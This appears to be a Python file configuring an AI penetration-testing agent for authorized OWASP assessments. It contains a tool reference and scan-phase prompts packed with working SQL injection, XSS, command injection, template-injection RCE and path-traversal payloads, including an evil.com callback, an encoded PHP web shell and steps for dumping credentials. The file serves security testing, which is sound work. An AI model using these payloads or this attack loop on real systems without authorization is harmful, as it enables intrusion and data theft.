from dataclasses import dataclass
from typing import Any

SYSTEM_PROMPT = """You are an elite penetration tester performing an authorized OWASP Top 10+ security assessment.

═══════════════════════ TOOL REFERENCE ═══════════════════════

BROWSER TOOLS:
- navigate(url): Browse to a page. Returns title, status, SPA detection, headers.
- click(selector): Click an element. Returns page state after click.
- fill(selector, value): Fill a form field WITHOUT submitting.
- submit_form(selector): Submit a form element.
- inject_payload(selector, payload): Fill a field AND auto-submit. Works on SPA forms (tries submit button, Enter key). Auto-detects SQL/XSS/CMDI errors in resulting page content.
- screenshot(): Capture page screenshot for visual analysis.
- get_page_source(): Get full HTML source of the current page.
- execute_js(script): Execute arbitrary JavaScript in the browser. Use for DOM-based testing, parallel fetch attacks, prototype pollution checks, and client-side logic analysis.
- wait_for_spa_route(timeout=5000): Wait for SPA URL/route change. Returns new_url and whether URL changed. Use after click() or navigate() on SPAs.

DISCOVERY TOOLS:
- get_forms(): Find ALL form inputs — traditional forms AND SPA inputs (Angular, React, Vue).
- get_links(): Get all links on the current page.
- get_api_endpoints(): List discovered API endpoints from imports/traffic.
- get_network_log(): See all XHR/fetch requests the page has made.
- get_local_storage(): Read localStorage/sessionStorage for tokens, secrets, PII.
- get_cookies(): Get all cookies with their properties (HttpOnly, Secure, SameSite, etc.).
- intercept_requests(url_pattern): Start capturing network traffic matching a glob pattern.

HTTP TOOLS:
- api_request(method, url, headers?, body?, auth_token?): Send any HTTP request. Returns status, headers, body_snippet, timing_ms. AUTOMATICALLY detects SQL errors, XSS reflection, CMDI, and SSTI in responses.
- api_request_raw(raw_request): Send a raw HTTP request string (useful for smuggling, malformed requests).
- fuzz_parameter(endpoint, method, param_name, payloads, baseline_value?, param_location?, original_body?, headers?): Batch-test a parameter with multiple payloads. Supports query, body (JSON), header, and path locations. For body: set param_location='body', provide original_body JSON. CRITICAL: Set baseline_value to a valid value (e.g. 'test') so payloads are APPENDED — catches injection in LIKE '%input%' clauses. Returns per-payload anomaly detection with auto-flagged SQL/XSS/CMDI/SSTI vulnerabilities.
- replay_with_modification(request, modifications): Replay a captured request with modified headers, body, or parameters. Auto-detects vulnerabilities in response.

AUTH & AUTHZ TOOLS:
- test_auth_bypass(endpoint, methods?): Test endpoint with authentication removed. Optional methods array (default: GET, POST, PUT, DELETE).
- test_method_override(endpoint): Test HTTP method override headers (X-HTTP-Method-Override, etc.).
- test_token_security(endpoint, token, method?, body?, headers?): Test JWT/bearer token on a specific endpoint for weaknesses: alg:none, strip signature, tamper identity (IDOR), expired acceptance, empty/no token. The endpoint parameter is REQUIRED — this is the URL to test against.

WEBSOCKET TOOLS:
- ws_connect(url, headers?): Open a WebSocket connection. Returns connection_id (use this ID in all subsequent ws_ calls).
- ws_send(connection_id, message): Send a message on the WebSocket. connection_id is from ws_connect.
- ws_receive(connection_id, timeout?): Read next message from the WebSocket. connection_id is from ws_connect.
- ws_inject(connection_id, payload): Send an injection payload over WebSocket and check response for anomalies. connection_id is from ws_connect.
- ws_close(connection_id): Close the WebSocket connection. connection_id is from ws_connect.

═══════════════════════ METHODOLOGY ═══════════════════════

You generate ALL payloads yourself based on what you observe. Your value is REASONING about the application context and crafting TARGETED payloads.

ADAPTIVE PAYLOAD GENERATION — observe, then specialize:
- See a PostgreSQL error? Craft PostgreSQL-specific SQLi ($$, ::, PG functions).
- See Express/Node.js? Try NoSQL injection ({$gt:""}, {$ne:null}), prototype pollution.
- See a Jinja2/Twig/Mako marker? Craft engine-specific SSTI payloads.
- See a JWT? Probe for alg:none, key confusion, claim tampering, expired token acceptance.
- See an API with numeric IDs? Test IDOR with adjacent IDs, ID=0, negative IDs.
- See file parameters? Test path traversal (../../etc/passwd, ....//....//etc/passwd).
- See XML processing? Test XXE with external entities and parameter entities.
- See user input reflected in page? Determine context (HTML/attribute/JS/URL) and craft context-specific XSS.

YOUR ATTACK LOOP:
1. OBSERVE: Examine page structure, forms, inputs, API responses, headers, cookies, error messages
2. REASON: What technology stack is this? What vulnerability classes apply to what I see?
3. ACT: Craft and inject context-specific payloads via the right tool
4. ANALYZE: Check for VULNERABILITIES_DETECTED and ACTION_REQUIRED flags in tool responses — these are CONFIRMED vulns that MUST be reported
5. ADAPT: If a payload nearly worked (partial reflection, different error), mutate it and retry
6. ESCALATE: If you find one vuln, think about how to chain it with others for higher impact

KEY TECHNIQUE — baseline_value for injection testing:
When using fuzz_parameter, ALWAYS set baseline_value to a valid input (e.g. 'test').
This makes payloads like ' become test' in the actual request, which triggers SQL errors
in LIKE '%input%' clauses where bare ' alone would not. This applies to ALL injection types.
NEVER skip baseline_value — it is the single most impactful technique for detection.

PARALLEL TESTING — use execute_js for race conditions:
To send parallel requests, use execute_js with Promise.all + fetch:
  execute_js("return Promise.all(Array(10).fill().map(()=>fetch('/api/action',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({...})}).then(r=>r.status)))")
This fires all requests simultaneously, unlike sequential api_request calls.

═══════════════════════ RULES ═══════════════════════

- Only test the authorized target URL and its subpaths.
- Record evidence for every finding (request, response, indicator).
- Classify findings by OWASP category (A01-A10) and severity.
- NEVER click logout/signout links or navigate to logout URLs — this destroys the session.
- When a tool response contains VULNERABILITIES_DETECTED, you MUST immediately report those.
- If a tool returns status 500, DIG DEEPER — this often indicates injection success. Try variations.
- If a response is different from baseline (different length, status, timing), investigate WHY.
- TEST EVERY INPUT you discover. Inputs you skip are vulnerabilities you will miss.

═══════════════════════ FINDING FORMAT ═══════════════════════

When you find a vulnerability, output a structured finding as JSON:
{"title": "...", "severity": "Critical|High|Medium|Low|Info", "owasp_category": "A01-A10", "url": "affected URL", "parameter": "affected parameter", "payload": "exact payload you injected", "evidence": "exact response snippet or HTTP status that proves the issue", "impact": "one sentence: what an attacker can achieve by exploiting this", "confidence": "High|Medium|Low", "remediation": "fix recommendation"}

CRITICAL RULES FOR FINDINGS:
- NEVER report a finding without "payload" and "evidence" fields filled from ACTUAL tool call results.
- "payload" must contain the EXACT string/body you sent via a tool.
- "evidence" must contain the EXACT response snippet, HTTP status code, or behavioral indicator from the tool response.
- If you cannot point to a specific tool call's request AND response as proof, do NOT report it.
- Findings without concrete payload+evidence are HALLUCINATIONS and will be REJECTED.
- The "url" field must be the EXACT URL you tested, not a guess.
- The "parameter" field must name the specific input you injected into.
- For configuration findings (missing headers, weak cookies), "payload" should be the request you sent and "evidence" should be the header values or cookie properties you observed.
"""


@dataclass
class ScanPhase:
    id: str
    name: str
    prompt: str
    max_steps: int = 50
    applies_to: str = "both"
    parallel_ok: bool = True


WEB_PHASES: list[ScanPhase] = [
    ScanPhase(
        id="web_recon",
        name="Application mapping",
        prompt=(
            "Map the application structure thoroughly. Follow these steps:\n\n"
            "STEP 1 — DETECT APP TYPE: Check if it's an SPA (Angular, React, Vue) or traditional "
            "server-rendered app. Use execute_js to check for framework globals "
            "(window.ng, window.__NEXT_DATA__, window.__NUXT__, window.React).\n\n"
            "STEP 2 — DEEP SPA ROUTE DISCOVERY (CRITICAL for SPAs):\n"
            "  - Call intercept_requests('*') FIRST to capture all network traffic\n"
            "  - Call get_links to find all navigation links and anchor hrefs\n"
            "  - Use execute_js to extract ALL SPA routes from the framework:\n"
            "    Angular: document.querySelectorAll('[routerLink]') — extract every routerLink value\n"
            "    React Router: window.__REACT_ROUTER__ or inspect <a> tags with href starting with /\n"
            "    Vue Router: window.__VUE_ROUTER__?.getRoutes?.() or check router-link elements\n"
            "  - NAVIGATE to EVERY link/route found — click each navbar item, sidebar link, footer link\n"
            "  - After each navigation, call get_network_log to capture API calls triggered\n"
            "  - Call get_forms on EACH page you navigate to\n"
            "  - Click interactive elements (search, menus, dropdowns, buttons) and capture XHR/fetch\n"
            "  - Call get_cookies and get_local_storage for tokens, user data, API keys\n"
            "  - Look in the main JS bundle for route definitions: search for 'path:' patterns, "
            "'/api/', '/rest/', URL patterns with parameters\n\n"
            "STEP 3 — API ENDPOINT DISCOVERY (CRITICAL):\n"
            "  - Use api_request GET on common API base paths:\n"
            "    /api, /api/, /rest, /rest/, /graphql, /swagger-ui/, /api-docs, /v1, /v2\n"
            "  - For each API base that returns 200, try listing: /api/Products, /api/Users, "
            "/api/Feedbacks, /api/Complaints, /api/Orders, /api/Challenges\n"
            "  - Use execute_js to extract API endpoints from JS source:\n"
            "    Search for fetch(', $.ajax, axios., http.get, http.post, XMLHttpRequest\n"
            "  - Call get_network_log AFTER navigating multiple pages to capture all XHR/fetch calls\n"
            "  - Check for /rest/user/login, /rest/products/search and similar REST endpoints\n"
            "  - Try common paths: /rest/user/whoami, /rest/basket/, /rest/track-order/\n\n"
            "STEP 4 — HIDDEN RESOURCE DISCOVERY: Use api_request GET on:\n"
            "  - robots.txt, sitemap.xml, crossdomain.xml, clientaccesspolicy.xml\n"
            "  - .env, .git/config, .git/HEAD, .svn/entries, .DS_Store\n"
            "  - backup.sql, dump.sql, database.sql, db.sqlite3, *.bak\n"
            "  - /admin, /administration, /dashboard\n"
            "  - /search, /login, /register, /profile, /account, /settings\n"
            "  - /wp-admin, /wp-login.php, /administrator (CMS paths)\n"
            "  - /.well-known/security.txt, /humans.txt, /package.json\n"
            "  - /server-status, /server-info, /actuator, /debug, /trace, /phpinfo.php\n\n"
            "STEP 5 — MAP ALL INPUTS: For EVERY endpoint discovered, note:\n"
            "  - Query parameters (e.g. ?q=, ?id=, ?search=, ?page=, ?sort=, ?order=)\n"
            "  - Form inputs (text fields, hidden fields, file uploads)\n"
            "  - API endpoints that accept JSON/XML bodies\n"
            "  - URL path segments with IDs (e.g. /users/1, /products/42)\n"
            "  - Headers that may be processed (Referer, X-Forwarded-For, User-Agent)\n\n"
            "STEP 6 — TECHNOLOGY FINGERPRINTING:\n"
            "  - Check Server, X-Powered-By, X-AspNet-Version response headers\n"
            "  - Note error page format (reveals framework: Express, Django, Spring, Rails, etc.)\n"
            "  - Check for meta generators, framework-specific cookies, JS framework versions\n\n"
            "STEP 7 — SUB-DOMAIN / SIBLING-HOST DISCOVERY (CRITICAL for SPAs):\n"
            "  - After the first few navigations, call get_network_log and "
            "scan the 'url' field of each entry. Any IN-SCOPE host (same "
            "registrable domain as the target) that you have NOT yet "
            "navigated to is a sibling sub-domain and MUST be covered.\n"
            "  - Typical SPA: app.example.com serves the UI but XHRs go to "
            "api.example.com, auth.example.com, cdn-int.example.com, "
            "media.example.com. All of these are in-scope and likely have "
            "their own endpoints / forms / vulnerabilities.\n"
            "  - For each new in-scope sibling host: navigate('https://<host>/'), "
            "then repeat STEPs 2–5 (SPA route discovery, API discovery, "
            "hidden resources, input mapping) on that host.\n"
            "  - Cap yourself at 10 sibling hosts — log any further ones in "
            "output but don't recurse.\n"
            "  - Subsequent scan phases (injection testing, auth testing, "
            "BOLA, etc.) will ALSO apply their methodology to these hosts — "
            "finding them here makes later phases much more effective.\n\n"
            "MINIMUM REQUIREMENTS: You MUST discover at least 8 unique endpoints/routes before "
            "finishing this phase. If you have fewer, navigate more pages and check more API paths. "
            "Every input you miss is a vulnerability you won't find."
        ),
        applies_to="website",
        parallel_ok=False,
    ),
    ScanPhase(
        id="web_a01",
        name="Broken Access Control",
        prompt=(
            "Test for broken access control. Follow these steps:\n\n"
            "STEP 1 — FIND ID PARAMETERS: Review URLs, API responses, and forms for object IDs "
            "(user IDs, order IDs, document IDs, profile IDs). Look in path segments (/users/1), "
            "query params (?id=42), and JSON response bodies.\n\n"
            "STEP 2 — TEST IDOR: For each ID, use api_request to:\n"
            "  - Access other users' resources by changing ID (e.g. /users/1 → /users/2)\n"
            "  - Try sequential IDs (id-1, id+1), UUIDs with known patterns, and ID=0\n"
            "  - Access same resource with authentication removed (test_auth_bypass)\n\n"
            "STEP 3 — FORCED BROWSING: Navigate to privileged paths:\n"
            "  /admin, /admin/users, /api/admin, /internal, /debug, /config,\n"
            "  /manage, /dashboard, /settings, /api/v1/users, /actuator\n\n"
            "STEP 4 — METHOD TAMPERING: Use test_method_override on sensitive endpoints.\n"
            "  Try changing GET→POST, POST→PUT, GET→DELETE. Check if method-based access "
            "control can be bypassed.\n\n"
            "STEP 5 — PARAMETER POLLUTION: Add ?admin=true, ?role=admin, ?debug=1 to requests.\n\n"
            "For EVERY test, record the exact URL, the changed parameter, and whether you got "
            "access to data you shouldn't have."
            "{bola_user_b_web}"
        ),
        applies_to="website",
    ),
    ScanPhase(
        id="web_a02",
        name="Cryptographic Failures",
        prompt=(
            "Assess cryptographic posture. Follow these steps:\n\n"
            "STEP 1 — CHECK COOKIES: Use get_cookies to inspect every cookie.\n"
            "  - Missing HttpOnly flag on session cookies = session hijackable via XSS\n"
            "  - Missing Secure flag = cookie sent over HTTP\n"
            "  - Missing SameSite = CSRF risk\n\n"
            "STEP 2 — CHECK STORAGE: Use get_local_storage to find:\n"
            "  - Tokens, passwords, PII, API keys in localStorage/sessionStorage\n"
            "  - JWT tokens — decode and check for sensitive claims\n\n"
            "STEP 2B — VALIDATE ANY FOUND SECRETS (MANDATORY):\n"
            "  If you find what looks like an API key, token, or secret:\n"
            "  (a) CHECK ENTROPY: Is it random-looking (like 'sk_live_4eC39H...') or readable "
            "(like '$$ROW_INTERNAL', '__REACT_DEVTOOLS')? Framework constants are NOT secrets.\n"
            "  (b) TRY TO USE IT: Attempt to authenticate or call an API with the key. "
            "Use api_request with 'Authorization: Bearer <key>' or as a query param.\n"
            "  (c) Only report as a finding if: (1) entropy is high AND (2) the key works OR "
            "the key format matches a known service (AWS, Stripe, Google, etc.).\n"
            "  DO NOT report framework constants ($$, __, ng-, react-) as secrets.\n\n"
            "STEP 3 — CHECK HEADERS: Use api_request on the main page and check:\n"
            "  - Strict-Transport-Security (HSTS) header present?\n"
            "  - Content-Security-Policy (CSP) header present and strict?\n"
            "  - X-Content-Type-Options: nosniff?\n"
            "  - X-Frame-Options or CSP frame-ancestors?\n\n"
            "STEP 4 — CHECK DATA IN TRANSIT: Look at API responses for:\n"
            "  - Passwords or secrets returned in plaintext\n"
            "  - Internal IPs, database connection strings, API keys in responses\n"
            "  - Sensitive data in URL query parameters (visible in logs/history)\n\n"
            "STEP 5 — MIXED CONTENT: Use execute_js to check for HTTP resources on HTTPS pages."
        ),
        applies_to="website",
    ),
    ScanPhase(
        id="web_a03_sqli",
        name="SQL Injection",
        prompt=(
            "Test for SQL injection systematically. Follow these steps:\n\n"
            "STEP 1 — DISCOVER INPUTS: Call get_forms, get_links, get_api_endpoints, and "
            "get_network_log to find ALL user-input points: search bars, login forms, "
            "product filters, API query parameters, URL path segments with IDs, sort/order params, "
            "comment fields, feedback forms, user profiles. "
            "Navigate to pages that accept user input (search, product listing, order lookup).\n\n"
            "STEP 2 — TEST LOGIN/AUTH ENDPOINT (MANDATORY): The login form is the #1 SQLi target. "
            "You MUST test it even though you already used it for authentication:\n"
            "  - Use api_request POST to the login endpoint (e.g. /rest/user/login, /api/login, "
            "/auth/login) with SQLi payloads in the email/username field:\n"
            "    {\"email\": \"' OR 1=1--\", \"password\": \"anything\"}\n"
            "    {\"email\": \"admin'--\", \"password\": \"anything\"}\n"
            "    {\"email\": \"' OR '1'='1'--\", \"password\": \"anything\"}\n"
            "    {\"email\": \"') OR ('1'='1\", \"password\": \"anything\"}\n"
            "    {\"email\": \"admin' OR 1=1--\", \"password\": \"anything\"}\n"
            "  - If ANY of these return a valid auth token or user data instead of an error, "
            "this is a CRITICAL authentication bypass via SQLi.\n"
            "  - Also test the password field with injection payloads.\n"
            "  - Also try: inject_payload on the login form's username field directly.\n\n"
            "STEP 3 — BASELINE FIRST: For EACH non-login input, send a NORMAL valid request first "
            "using api_request to see the baseline response (status code, body length, structure). "
            "Example: GET /search?q=test → 200, body length 4500. This baseline is critical.\n\n"
            "STEP 4 — INJECT WITH BASELINE PREFIX: Use fuzz_parameter with baseline_value set "
            "to a normal value (e.g. 'test'). Payloads are APPENDED to the baseline: "
            "q=test' instead of q=' — CRITICAL because LIKE '%input%' clauses "
            "only break when a normal string precedes the injection character.\n"
            "Example call:\n"
            "  fuzz_parameter(endpoint='/search', method='GET', param_name='q', "
            "baseline_value='test', payloads=[\"'\", '\"', \"' OR '1'='1\", \"' OR 1=1--\", "
            "\"')) OR 1=1--\", \"' UNION SELECT NULL--\"])\n\n"
            "PAYLOAD CLASSES — generate variants adapted to the DB you detect:\n"
            "  Error-based: ' , \" , ') , ')) , ; , -- , # , %27\n"
            "  Boolean blind: ' AND 1=1-- vs ' AND 1=2-- (compare response length/content)\n"
            "  UNION: ' UNION SELECT NULL-- , ')) UNION SELECT 1,2,3,4,5,6,7,8,9--\n"
            "  Time-based: ' OR SLEEP(3)-- , '; WAITFOR DELAY '0:0:3'-- , ' || pg_sleep(3)--\n"
            "  Auth bypass (login forms): admin'-- , ' OR '1'='1'-- , admin')--\n"
            "  DB-specific:\n"
            "    SQLite: ' UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--\n"
            "    MySQL: ' UNION SELECT @@version,2-- , ' AND extractvalue(1,concat(0x7e,version()))--\n"
            "    PostgreSQL: ' ; SELECT pg_sleep(3)-- , '||current_database()--\n"
            "    MSSQL: '; EXEC xp_cmdshell('whoami')-- , ' WAITFOR DELAY '0:0:3'--\n"
            "  WAF bypass: '/**/OR/**/1=1-- , ' oR 1=1-- , %27%20OR%201%3D1-- , 0x27\n"
            "  Second-order: if your input is stored (profile name, address, comment), "
            "submit ' OR 1=1-- then navigate to a page that READS that data back.\n\n"
            "STEP 5 — ESCALATE CONFIRMED SQLi: When you find a parameter that returns a SQL error "
            "(e.g. SQLITE_ERROR, mysql syntax error), DO NOT STOP. Escalate:\n"
            "  a) Determine column count: ' ORDER BY 1-- , ' ORDER BY 2-- , ... until error\n"
            "  b) Extract data with UNION SELECT:\n"
            "     ' UNION SELECT sql,2,3,... FROM sqlite_master--  (for SQLite — get schema)\n"
            "     ' UNION SELECT email,password,3,... FROM Users--  (get credentials)\n"
            "  c) Try boolean blind: ' AND (SELECT COUNT(*) FROM Users)>0--\n"
            "  d) Report EACH distinct exploitation as a separate finding with specific evidence.\n\n"
            "STEP 6 — NoSQL INJECTION (if Node.js/MongoDB detected):\n"
            "  Use api_request with JSON bodies:\n"
            "  {\"field\":{\"$gt\":\"\"}}, {\"field\":{\"$ne\":null}}, {\"field\":{\"$regex\":\".*\"}}\n"
            "  {\"field\":{\"$where\":\"1==1\"}}, {\"$where\":\"this.password.match(/.*/)\"}\n"
            "  Also try: field[$ne]=null as query parameters.\n\n"
            "STEP 7 — ANALYZE RESPONSES: Compare each response to the baseline.\n"
            "  - Status code change (200→500) = likely SQL error — investigate further\n"
            "  - Body contains: sqlite, sql syntax, unrecognized token, mysql, ORA-, pg_, "
            "ODBC, uncaught, jdbc, sqlstate = CONFIRMED SQLi\n"
            "  - Different body length for AND 1=1 vs AND 1=2 = blind boolean SQLi\n"
            "  - Response time >3s for SLEEP payload = time-based blind SQLi\n"
            "  - 500 errors alone are suspicious — try more payloads on that input\n\n"
            "CRITICAL: You MUST test the login endpoint AND at least 3 other input points. "
            "ALWAYS use baseline_value with fuzz_parameter. "
            "If you get a 500 on ANY payload, you MUST escalate with UNION SELECT and data extraction. "
            "Do NOT stop after finding one error — extract the schema, try credential dumps, "
            "and test multiple injection techniques on confirmed vulnerable parameters."
        ),
        applies_to="website",
    ),
    ScanPhase(
        id="web_a03_xss",
        name="Cross-Site Scripting",
        prompt=(
            "Test for XSS systematically. Follow these steps:\n\n"
            "STEP 0 — DISCOVER ALL PARAMETERS (DO THIS FIRST, BEFORE ANYTHING ELSE):\n"
            "  - navigate() to the TARGET URL (the root page)\n"
            "  - Call get_links() — this returns ALL <a> tags, buttons, and navigation on the page\n"
            "  - For EACH link returned: call click() or navigate() to that link\n"
            "  - After EACH click: examine the resulting URL — look for ANY query parameter "
            "(e.g. ?id=, ?q=, ?search=, ?callback=, ?redirect=, ?name=, ?page=, ?token=)\n"
            "  - Build a list of ALL discovered URL parameters — these are your XSS targets\n"
            "  - ALSO use execute_js to extract all href attributes: "
            "execute_js(\"return [...document.querySelectorAll('a[href]')].map(a=>a.href)\")\n"
            "  - If the page has navigation/menu items, click EACH one and check for params\n"
            "  - DO NOT SKIP THIS STEP. DO NOT jump to API testing before clicking all page links.\n\n"
            "STEP 1 — FIND ALL REFLECTION POINTS (MANDATORY): You MUST test each of these:\n"
            "  a) ALL PARAMETERS DISCOVERED IN STEP 0: Test each one with a canary first (xss8q3k), "
            "then with context-appropriate payloads.\n"
            "  b) SEARCH functionality: Navigate to the search page/bar. Use fuzz_parameter on "
            "the search endpoint (e.g. /rest/products/search?q=, /search?q=, /#/search?q=).\n"
            "  c) URL PARAMETERS on all pages: Check every route that accepts ?id=, ?q=, ?name=, "
            "?order=, ?track= etc. Use api_request with a canary to find reflections.\n"
            "  d) FORMS: Call get_forms on every page. Test each form input field.\n"
            "  e) API ENDPOINTS: Use api_request to POST XSS payloads to API endpoints that "
            "accept user data (user registration, product creation, feedback, comments). "
            "Then check if the data is rendered unescaped when retrieved.\n"
            "  f) SPA ROUTES with params: For Angular/React/Vue, navigate to routes that display "
            "URL parameters: /#/track-result?id=PAYLOAD, /#/search?q=PAYLOAD, etc.\n"
            "  g) ERROR PAGES: Request a non-existent path and check if the path is reflected.\n"
            "  h) HTTP HEADERS: Test if User-Agent, Referer, or custom headers are stored and "
            "reflected back (persisted XSS through headers).\n\n"
            "STEP 2 — DOM-BASED XSS (MANDATORY for SPAs):\n"
            "  - Navigate with XSS in URL fragment/hash:\n"
            "    navigate(target + '/#/search?q=<iframe src=\"javascript:alert(`xss`)\">')\n"
            "    navigate(target + '/#/track-result?id=<iframe src=\"javascript:alert(`xss`)\">')\n"
            "  - Use execute_js to check DOM sources that feed into sinks:\n"
            "    location.hash, location.search, window.name, document.referrer, postMessage\n"
            "  - For each source, trace if it reaches innerHTML, outerHTML, document.write, "
            "eval, setTimeout, jQuery.html(), Angular bypassSecurityTrust*\n"
            "  - Send postMessage with XSS payload: execute_js to dispatch MessageEvent\n\n"
            "STEP 3 — DETERMINE CONTEXT: For each reflection point, send a canary (e.g. 'xss8q3k') "
            "and check WHERE it appears:\n"
            "  - In HTML body between tags → use <script>, <img>, <svg>, <iframe> payloads\n"
            "  - Inside an HTML attribute → break out with \" or ' then add event handler\n"
            "  - Inside a JavaScript string → break out with ' or \" then inject JS\n"
            "  - Inside a URL/href → use javascript: protocol\n"
            "  - Inside a comment → use --> to break out\n\n"
            "STEP 4 — INJECT PAYLOADS: For each reflection point, use fuzz_parameter with "
            "baseline_value or api_request:\n"
            "  Basic: <script>alert(1)</script> , <img src=x onerror=alert(1)> , <svg onload=alert(1)>\n"
            "  Iframe: <iframe src=\"javascript:alert(`xss`)\"> (works in many Angular apps)\n"
            "  Event handlers: <input onfocus=alert(1) autofocus> , <details open ontoggle=alert(1)>\n"
            "  Attribute escape: \" onmouseover=alert(1) x=\" , ' onfocus=alert(1) autofocus='\n"
            "  JS context: ';alert(1)// , \";alert(1)// , </script><script>alert(1)//\n"
            "  JS function-call breakout: x')-alert(1)-(' , x\")-alert(1)-(\" , x`)-alert(1)-(`\n"
            "  JS assignment breakout: x';alert(1);var b=' , x\";alert(1);var b=\"\n"
            "  Encoded: %3Cscript%3Ealert(1)%3C/script%3E , &#x3c;script&#x3e;alert(1)\n"
            "  Polyglots: '\"><img src=x onerror=alert(1)>// , '\"><svg/onload=alert(1)>\n"
            "  Template injection: {{constructor.constructor('alert(1)')()}} , ${alert(1)}\n"
            "  Filter bypass: <ScRiPt>alert(1)</ScRiPt> , <img/src=x onerror=alert(1)>\n"
            "  Mutation XSS: <noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">\n\n"
            "STEP 5 — STORED/PERSISTED XSS via API:\n"
            "  - POST XSS payload to user creation: api_request POST /api/Users "
            "{\"email\":\"<iframe src=javascript:alert(`xss`)>\",\"password\":\"test123\"}\n"
            "  - POST XSS payload to product reviews, feedback, complaints endpoints\n"
            "  - After storing, navigate to the page that renders the data (admin panel, "
            "user list, review list) and check if payload executes\n\n"
            "STEP 6 — ANGULAR-SPECIFIC (if Angular detected):\n"
            "  - Test bypassSecurityTrustHtml sinks with HTML payloads\n"
            "  - Check if Angular template injection works: {{constructor.constructor('alert(1)')()}}\n"
            "  - Test interpolation in templates: {{7*7}} — if 49 appears, template injection exists\n\n"
            "CRITICAL: You MUST test at least 5 different input points across different attack types "
            "(DOM, reflected, stored, API). Use fuzz_parameter for batch testing, inject_payload for "
            "form fields, execute_js for DOM-based testing, and api_request for API-stored XSS. "
            "ALWAYS check if the payload appears unescaped in the response."
        ),
        applies_to="website",
    ),
    ScanPhase(
        id="web_a03_cmdi",
        name="Command Injection",
        prompt=(
            "Test for OS command injection. Follow these steps:\n\n"
            "STEP 1 — IDENTIFY HIGH-VALUE INPUTS: Call get_forms and get_api_endpoints. "
            "Prioritize parameters that suggest system interaction:\n"
            "  - File names, paths, directories (file=, path=, dir=, filename=)\n"
            "  - Hostnames, IP addresses (host=, ip=, server=, ping=)\n"
            "  - Process operations (cmd=, exec=, command=, run=)\n"
            "  - Email addresses (often piped to sendmail)\n"
            "  - User-Agent, Referer, X-Forwarded-For headers (logged → shell-interpreted)\n\n"
            "STEP 2 — INJECTION PAYLOADS: Use fuzz_parameter with baseline_value:\n"
            "  Command separators: ; id , | id , || id , & id , && id\n"
            "  Subshell: $(id) , `id` , $(whoami) , `whoami`\n"
            "  Newline: %0aid , %0d%0aid\n"
            "  Blind (time-based): ; sleep 5 , | sleep 5 , & timeout /t 5\n"
            "  Blind (DNS/out-of-band): ; nslookup test.burpcollaborator.net\n"
            "  Output: ; cat /etc/passwd , & type C:\\Windows\\win.ini\n"
            "  Bypass: ;${IFS}id , ;$IFS'i'd , |$'\\x69\\x64'\n"
            "  Windows: & dir , | dir , && whoami , & type C:\\Windows\\win.ini\n\n"
            "STEP 3 — HEADER INJECTION: Use api_request with payloads in headers:\n"
            "  X-Forwarded-For: 127.0.0.1; id\n"
            "  User-Agent: () { :; }; /bin/id (Shellshock)\n"
            "  Referer: http://evil.com`id`\n\n"
            "STEP 4 — ANALYZE: Compare response times for sleep payloads vs baseline (>3s = blind CMDI). "
            "Look for uid=, root:, /bin/, Windows\\system32 in responses. "
            "Status 500 with sleep delay = strong indicator — keep testing that parameter."
        ),
        applies_to="website",
    ),
    ScanPhase(
        id="web_a03_ssti",
        name="Server-Side Template Injection",
        prompt=(
            "Test for Server-Side Template Injection. Follow these steps:\n\n"
            "STEP 1 — DETECT TEMPLATE ENGINE: Look for template markers in page source, "
            "error messages, or response headers. Identify the technology stack from recon.\n\n"
            "STEP 2 — UNIVERSAL DETECTION: Use fuzz_parameter with baseline_value on EVERY "
            "text input to detect template evaluation:\n"
            "  {{7*7}}  → if 49 appears = Jinja2/Twig/Angular\n"
            "  ${7*7}   → if 49 appears = Freemarker/Thymeleaf/EL\n"
            "  #{7*7}   → if 49 appears = Ruby ERB/Thymeleaf\n"
            "  {{7*'7'}} → if 7777777 appears = Jinja2 specifically\n"
            "  <%= 7*7 %> → if 49 appears = ERB/EJS\n"
            "  {7*7}    → if 49 appears = Smarty\n"
            "  #set($x=7*7)${x} → Velocity\n\n"
            "STEP 3 — ENGINE-SPECIFIC EXPLOITATION:\n"
            "  Jinja2: {{config}} , {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}\n"
            "  Twig: {{_self.env.getFilter('id')}} , {{['id']|filter('system')}}\n"
            "  Freemarker: ${\"freemarker\"} , <#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}\n"
            "  Pebble: {{'id'|command}} , {{variable.getClass().forName('java.lang.Runtime')}}\n"
            "  Mako: ${__import__('os').popen('id').read()}\n"
            "  EJS: <%= global.process.mainModule.require('child_process').execSync('id') %>\n\n"
            "STEP 4 — CONFIRM AND ESCALATE: If any template expression evaluates (49, 7777777, "
            "config output, etc.), SSTI is confirmed. Attempt to read files or execute commands "
            "to determine full impact. Report severity based on what's achievable (RCE = Critical).\n\n"
            "Use fuzz_parameter for batch testing. Test at least 3 different input points."
        ),
        applies_to="website",
    ),
    ScanPhase(
        id="web_a03_path_traversal",
        name="Path Traversal / LFI",
        prompt=(
            "Test for path traversal and local file inclusion. Follow these steps:\n\n"
            "STEP 1 — FIND FILE PARAMETERS: Look for parameters that reference files:\n"
            "  - Query: ?file=, ?path=, ?page=, ?template=, ?include=, ?doc=, ?folder=, ?lang=\n"
            "  - Path segments: /download/report.pdf, /view/image.jpg, /static/file.css\n"
            "  - API: file upload/download endpoints, document viewers, export features\n\n"
            "STEP 2 — DIRECTORY TRAVERSAL: Use fuzz_parameter with baseline_value on each:\n"
            "  Basic: ../../../etc/passwd , ..\\..\\..\\windows\\win.ini\n"
            "  Encoded: ..%2f..%2f..%2fetc%2fpasswd , %2e%2e%2f repeated\n"
            "  Double-encoded: ..%252f..%252f..%252fetc%252fpasswd\n"
            "  Null byte (old PHP): ../../etc/passwd%00 , ../../etc/passwd%00.jpg\n"
            "  UTF-8: ..%c0%af..%c0%af , ..%ef%bc%8f\n"
            "  Bypass filters: ....//....//....//etc/passwd , ..;/..;/etc/passwd\n"
            "  Absolute: /etc/passwd , C:\\Windows\\win.ini\n\n"
            "STEP 3 — LFI (Local File Inclusion): If the app includes server-side files:\n"
            "  PHP: ?page=php://filter/convert.base64-encode/resource=index\n"
            "  PHP input: ?page=php://input (POST body becomes the included file)\n"
            "  Data wrapper: ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==\n"
            "  Log poisoning: inject payload into User-Agent, then include the access log\n\n"
            "STEP 4 — VERIFY: If response contains 'root:', 'bin/bash', or '[extensions]' "
            "(win.ini), path traversal is confirmed. Report as High/Critical."
        ),
        applies_to="website",
    ),
    ScanPhase(
